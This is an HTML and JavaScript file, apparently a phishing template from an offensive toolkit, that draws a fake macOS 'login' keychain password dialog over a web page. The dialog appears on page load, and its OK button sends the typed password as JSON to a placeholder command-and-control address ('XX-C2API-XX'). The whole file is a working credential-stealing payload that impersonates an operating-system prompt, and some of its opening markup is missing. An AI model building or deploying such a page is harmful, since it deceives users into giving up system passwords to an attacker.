<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>

    <style>
        #keychain-access {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            background-color: rgba(230,230,230,1);
            border-radius: 11px;
            padding: 20px;
            max-width: 400px;
            width: 400px;
            max-height: 124px;
            border: 1px solid rgb(184,184,184);
            box-shadow: 0px 10px 15px rgb(174,174,174);
            position: absolute;
            display: none;
            left: 50%;
            top: 20%;
        }

        p {
            padding: 0;
            margin: 0;
        }

        .content-col {
            flex: 1;
        }

        .row {
            display: flex;
            flex-direction: row;
            align-items: center;
        }


        .col {
            display: flex;
            flex-direction: column;
        }

        .img-col {
            margin-right: 10px;
        }

        .question-mark {
            border-radius: 50%;
            height: 20px;
            width: 20px;
            text-align: center;
            background-color: rgb(204,204,204);
        }

        .spacer {
            flex:1;
        }

        .title {
            font-weight: 650;
            font-size: 13px;
            max-width: 220px;
        }

        .subtext {
            font-size: 11px;
            margin-top: 8px;
        }

        .actions-row {
            margin-top: 20px;
        }

        .password-row {
            margin-top: 8px;
            align-items: center;
        }

        label {
            font-size: 13px;
        }

        #keychain-password {
            background-color: rgb(217,217,217);
            border: none;
            margin-left: 3px;
            flex:1;
            font-size: 20px;
            padding-left: 4px;
            margin-left: 8px;
            max-height: 18px
        }

        #keychain-password:focus {

            outline: 4px solid rgb(135,168,233);
            border-radius: 1px;
        }

        button {
            width: 69px;
            height: 20px;
            border-radius: 6px;
            border: none;
            font-size: 12px;
        }

        #keychain-cancel-button {
            margin-right: 8px;
            background-color: rgb(204,204,204);
        }

        #keychain-ok-button {
            background: linear-gradient(rgb(72,145,247), rgb(51,124,246));
            color: white;
        }
    </style>
</head>

            <div class="col content-col">
                <p class="title">macOS wants to use the "login" keychain.</p>
                <p class="subtext">Please enter the keychain password.</p>
                <div class="row password-row">
                    <label for="keychain-password">Password:</label>
                    <input id="keychain-password"
                           type="password"
                           data-lpignore="true"
                           autocomplete=false autofocus=true>
                </div>
            </div>
        </div>

        <div class="row actions-row">
            <div class="question-mark">?</div>
            <div class="spacer"></div>
            <div class="buttons">
                <button id="keychain-cancel-button" onclick="closeAccessWindow()">Cancel</button>
                <button id="keychain-ok-button" class="primary" onclick="submit()">OK</button>
            </div>
        </div>
    </div>

    <script>
        const access = document.getElementById("keychain-access");

        function closeAccessWindow() {
            access.style.display = "none";
        }

        function submit() {
            const password = document.getElementById("keychain-password").value;
            fetch("XX-C2API-XX", {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ application: 'keychain', password })
            }).then(closeAccessWindow)
        }

        function showKeychainAccessPrompt() {
            // Don't bother showing if the system isn't running Mac
            //if (navigator.platform && navigator.platform.startsWith("Mac")) {
                access.style.display = "block";
           // }
        }

        // Drag logic
        (() => {
            const mouseOrigin = { x: undefined, y: undefined };

            function drag(e) {
                e.preventDefault();

                let x = mouseOrigin.x - e.clientX;
                let y = mouseOrigin.y - e.clientY;

                Object.assign(mouseOrigin, { x: e.clientX, y: e.clientY });

                access.style.top = (access.offsetTop - y) + 'px';
                access.style.left = (access.offsetLeft - x) + 'px';
            }

            function stopDrag(e) {
                document.onmouseup = null;
                document.onmousemove = null;
            }

            access.addEventListener("mousedown", (e) => {
                e.preventDefault();
                Object.assign(mouseOrigin, { x: e.clientX, y: e.clientY });

                document.onmouseup = stopDrag;
                document.onmousemove = drag;
            })

            document.getElementById("keychain-password").addEventListener("mousedown", (e) => {
                e.stopPropagation();
            })
        })()


        showKeychainAccessPrompt();
    </script>
</body>
